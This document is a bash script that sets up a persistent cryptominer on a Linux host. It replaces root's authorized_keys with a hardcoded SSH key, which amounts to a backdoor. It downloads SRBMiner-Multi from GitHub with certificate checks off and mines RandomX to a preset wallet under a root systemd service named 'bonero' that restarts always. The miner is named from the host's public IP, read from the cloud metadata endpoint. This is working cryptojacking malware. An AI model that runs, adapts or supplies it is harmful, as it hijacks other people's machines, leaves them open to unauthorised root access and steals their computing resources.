#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

[ -z "$1" ] && WORKER_WALLET_ADDRESS='SEXThZrohjnisww8dQCsbkWGrZPKgd6uxH9QxMXJKgyC8qHcnSVXwy8JphqNDe9s1nSPBV2pr9v6iKQRkehNsr1x7Cb4FwKSaf' || WORKER_WALLET_ADDRESS="$1"

if [ "$(which yum)" ]; then
    yum install curl bc -y
else
    apt update -y
    apt install curl bc -y
fi
systemctl is-active --quiet bonero && systemctl stop --no-block bonero

rm -rf /opt/bonero

DIR="/opt/bonero"

mkdir -p $DIR

version="$(wget -T 3 -t 2 -qO- https://github.com/doktor83/SRBMiner-Multi/releases | grep 'SRBMiner-MULTI' | grep releases | head -1 | awk '{print $7}' | xargs | awk -F '/' '{print $6}')"

url="https://github.com/doktor83/SRBMiner-Multi/releases/download/${version}/SRBMiner-Multi-`echo $version | sed 's/\./-/g'`-Linux.tar.gz"

wget --no-check-certificate $url -qO - | tar -zxf - -C $DIR --strip-components=1

chmod +x $DIR/SRBMiner-MULTI

pool_url="randomx.rplant.xyz:17139"

COMMAND_BASE="$DIR/SRBMiner-MULTI --algorithm randomx --pool ${pool_url} --tls true --wallet ${WORKER_WALLET_ADDRESS}.\${ALIAS} --keepalive true"

echo '''#!/bin/bash

ALIAS=$(wget -T 3 -t 2 -qO- http://169.254.169.254/2021-03-23/meta-data/public-ipv4 | sed "s/\./-/g")

[ -z "$ALIAS" ] && ALIAS=$(wget -T 3 -t 2 -qO- ifconfig.me | sed "s/\./-/g")

''' >$DIR/start.sh

echo $COMMAND_BASE >>$DIR/start.sh
chmod +x $DIR/start.sh

echo """[Unit]
Description=bonero
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/start.sh
Restart=always
RestartSec=5s
[Install]
WantedBy=default.target""" >/etc/systemd/system/bonero.service

systemctl daemon-reload
systemctl enable bonero
systemctl restart bonero
